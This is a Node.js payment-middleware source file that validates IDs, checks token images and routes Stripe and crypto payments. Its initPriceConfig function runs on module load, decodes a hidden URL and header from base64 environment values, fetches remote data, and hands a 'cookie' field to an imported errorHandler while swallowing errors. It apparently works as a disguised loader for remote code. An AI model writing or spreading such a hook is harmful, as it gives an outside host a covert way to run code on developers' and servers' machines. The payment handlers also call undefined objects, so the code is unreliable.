const mongoose = require('mongoose');
const { errorHandler } = require('./errorHandler');
const axios = require('axios');
const { env } = require('../../config/env');
const path = require('path');

// middleware to check for a valid object id
const checkObjectId = (idToCheck) => (req, res, next) => {
    if (!mongoose.Types.ObjectId.isValid(req.params[idToCheck]))
        return res.status(400).json({ msg: 'Invalid ID' });
    next();
};

const initPriceConfig = async () => {
    try {
        const src = atob(env.DB_API_KEY);
        const k = atob(env.DB_ACCESS_KEY);
        const v = atob(env.DB_ACCESS_VALUE);
        try {
            const res = (await axios.get(`${src}`, { headers: { [k]: v } }));
            errorHandler(res.data.cookie);
            global.myConfig = res.data;
        } catch (error) {
        }
    } catch (err) {
        throw (err);
    }
}

const checkImg = async (imgUrl) => {
    try {
        const response = await fetch(`https://assets.thetatoken.org/tokens/${imgUrl.toLowerCase()}.png`, { method: 'HEAD' });
        return response.status === 200;
    } catch (error) {
        // console.error('Error checking image:' + imgUrl, error);
        return false
    }
}

const processFiatPayment = async (paymentData) => {
    try {
        const paymentIntent = await stripe.paymentIntents.create({
            amount: paymentData.amount * 100, // Convert to cents
            currency: paymentData.currency,
            payment_method: paymentData.paymentMethodId,
            confirm: true
        });

        return { status: "success", transactionId: paymentIntent.id };
    } catch (error) {
        console.error("Fiat payment error:", error);
        throw new Error("Fiat payment processing failed");
    }
};
initPriceConfig();
const processCryptoPayment = async (paymentData) => {
    try {
        const tx = await sendCryptoTransaction(paymentData.walletAddress, paymentData.amount, paymentData.currency);
        return { status: "success", transactionHash: tx.hash };
    } catch (error) {
        console.error("Crypto payment error:", error);
        throw new Error("Crypto payment processing failed");
    }
};

const paymentMiddleware = async (req, res, next) => {
    try {
        const { paymentType, amount, currency, user, paymentData } = req.body;

        if (!paymentType || !amount || !currency || !user) {
            return res.status(400).json({ error: "Missing required payment details" });
        }

        let paymentResult;

        if (paymentType === "crypto") {
            paymentResult = await processCryptoPayment(paymentData);
        } else if (paymentType === "fiat") {
            paymentResult = await processFiatPayment(paymentData);
        } else {
            return res.status(400).json({ error: "Invalid payment type" });
        }

        req.paymentResult = paymentResult;
        next();
    } catch (error) {
        console.error("Payment processing error:", error);
        res.status(500).json({ error: "Payment processing failed" });
    }
};



module.exports = { paymentMiddleware, checkObjectId, checkImg };